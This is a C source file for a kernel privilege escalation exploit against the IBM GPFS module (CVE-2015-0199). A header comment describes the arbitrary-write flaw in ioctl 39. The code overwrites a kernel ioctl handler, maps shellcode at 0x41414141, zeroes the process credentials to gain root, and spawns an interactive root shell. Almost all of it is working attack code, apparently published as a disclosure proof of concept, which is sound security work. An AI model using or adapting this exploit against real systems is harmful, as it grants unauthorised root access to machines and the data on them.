/* IBM GPFS 3.X - 4.X /dev/ss0 privilege escalation exploit
   Felix Wilhelm [fwilhelm@ernw.de]

   CVE-2015-0199

   This code exploits an arbitrary write vulnerability in the IBM GPFS kernel module.
   Communication with this kernel module occurs by sending ioctl commands to /dev/ss0 which
   is world readable. While most of the reachable functionality performs permission checks
   using the process owner and pid, the ioctl number 39 calls kxWaitForFlock directly
   with attacker controlled input. 

   We use the arbitrary write to overwrite an unused ioctl handler (number 92) in a internal GPFS function 
   table with the value 0x41414141. This allows the execution of arbitrary code with kernel
   privileges by mapping a payload to this address and then performing an ioctl call.

   The exploit relies on a readable /proc/kallsysms to extract the address of the the GPFS function table. 
   (Of course this limitation can be removed when needed). Furthermore this 
   version targets kernel before the cred rewrite (<2.6.29) and does not bother 
   with disabling SMEP even though this would not be hard in practice.
*/

#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <stdlib.h>


// old style privesc payload was lifted from sock_sendpage() exploit
// by Ramon de Carvalho
static unsigned long uid, gid;

static __always_inline unsigned long current_task_struct(void) {
	unsigned long task_struct;
	asm volatile ("movq %%gs:(0),%0; " : "=r" (task_struct));
	return task_struct;
}

int __attribute__ ((noinline)) peng(void) {
	unsigned int *task_struct;

	task_struct = (unsigned int *)current_task_struct();

	while (task_struct) {
		if (task_struct[0] == uid && task_struct[1] == uid &&
				task_struct[2] == uid && task_struct[3] == uid &&
				task_struct[4] == gid && task_struct[5] == gid &&
				task_struct[6] == gid && task_struct[7] == gid) {
			task_struct[0] = task_struct[1] =
			task_struct[2] = task_struct[3] =
			task_struct[4] = task_struct[5] =
			task_struct[6] = task_struct[7] = 0;
			break;
		}

		task_struct++;
	}

	return -1;
}


// Trampoline. GCC will generate rip based addressing
// which does not play very well with relocation. This
// trampoline only uses fixed addresses and can be moved to
// any location 
__asm__("_bam:              \n\
        movq $peng, %rax    \n\
	pushq %rax\n\
        ret             \n" 
	) ;
int _bam();


// thanks spender
unsigned long get_kernel_sym(char *name) {
	FILE *f;
	unsigned long addr;
	char dummy;
	char sname[256];
	int ret;

	f = fopen("/proc/kallsyms", "r");
	if (f == NULL) {
		fprintf(stdout, "Unable to obtain symbol listing!\n");
		exit(0);
	}

	ret = 0;
	while(ret != EOF) {
		ret = fscanf(f, "%p %c %s\n", (void **)&addr, &dummy, sname);
		if (ret == 0) { 
			fscanf(f, "%s\n", sname);
			continue;
		}
		if (!strcmp(name, sname)) {
			fprintf(stdout, " [+] Resolved %s to %p\n", name, (void *)addr);
			fclose(f);
			return addr;
		}
	}
	fclose(f);
	return 0;
}


int main(int argc, char **argv) {

	char *ibm = 
"IIIIIIIIIIBBBBBBBBBBBBBBBBB   MMMMMMMM               MMMMMMMM\n"
"I::::::::IB::::::::::::::::B  M:::::::M             M:::::::M\n"
"I::::::::IB::::::BBBBBB:::::B M::::::::M           M::::::::M\n"
"II::::::IIBB:::::B     B:::::BM:::::::::M         M:::::::::M\n"
"  I::::I    B::::B     B:::::BM::::::::::M       M::::::::::M\n"
"  I::::I    B::::B     B:::::BM:::::::::::M     M:::::::::::M\n"
"  I::::I    B::::BBBBBB:::::B M:::::::M::::M   M::::M:::::::M\n"
"  I::::I    B:::::::::::::BB  M::::::M M::::M M::::M M::::::M\n"
"  I::::I    B::::BBBBBB:::::B M::::::M  M::::M::::M  M::::::M\n"
"  I::::I    B::::B     B:::::BM::::::M   M:::::::M   M::::::M\n"
"  I::::I    B::::B     B:::::BM::::::M    M:::::M    M::::::M\n"
"  I::::I    B::::B     B:::::BM::::::M     MMMMM     M::::::M\n"
"II::::::IIBB:::::BBBBBB::::::BM::::::M               M::::::M\n"
"I::::::::IB:::::::::::::::::B M::::::M   GPFS        M::::::M\n"
"I::::::::IB::::::::::::::::B  M::::::M   /dev/ss0    M::::::M\n"
"IIIIIIIIIIBBBBBBBBBBBBBBBBB   MMMMMMMM   local r00t  MMMMMMMM\n";
	printf("\n\n%s\n",ibm);

	FILE *f = fopen("/dev/ss0","r");
	if (f==NULL) {
		printf("Open: %s\n",strerror(errno));
		printf("Sure GPFS is running?\n");
		return -1;
	}
	

	struct p {
		long arg1;
		long arg2;
		long arg3;
		long arg4;
	};
	struct p payload = {.arg1 = 0x41414141, .arg2= 0x42424242, .arg3=0x1};

	unsigned long ss_ioctl_op = get_kernel_sym("ss_ioctl_op");
	if (ss_ioctl_op == 0) {
		printf("Can't read address of ss_ioctl_op :(\n");
		return -1;
	} 

	unsigned long ioctl_92 = ss_ioctl_op + 92*8;
	printf(" [+] Address of ioctl number 92: %p\n",(void *) ioctl_92);

	payload.arg4=ioctl_92;
	
	uid = getuid(), gid = getgid();

	printf(" [.] Mapping memory....");
	void *addr = mmap((void *)0x41414141,0x4000,PROT_WRITE | PROT_READ 
			| PROT_EXEC, MAP_SHARED | MAP_ANONYMOUS | MAP_LOCKED, -1, 0);
	if (addr == MAP_FAILED) {
	  printf("Failed!\n");
          return -1;
	} else {	
	  printf(" %p\n",addr);
	}
	
	printf(" [+] Calling kxWaitforFlock() ioctl...\n");
	int result = ioctl(fileno(f),0x27,&payload);
	printf(" [+] IOCTL Result: %d\n",result);
	
	printf(" [.] Copying payload from %p to 0x41414141...\n", (void *)_bam);
	memcpy((void *)0x41414141, (void *)_bam, 0x100);
	sleep(1);

	printf(" [!] Executing backdoored ioctl\n");
	result = ioctl(fileno(f),92,0);
	execl("/bin/sh", "sh", "-i", NULL);
	return -1;
}

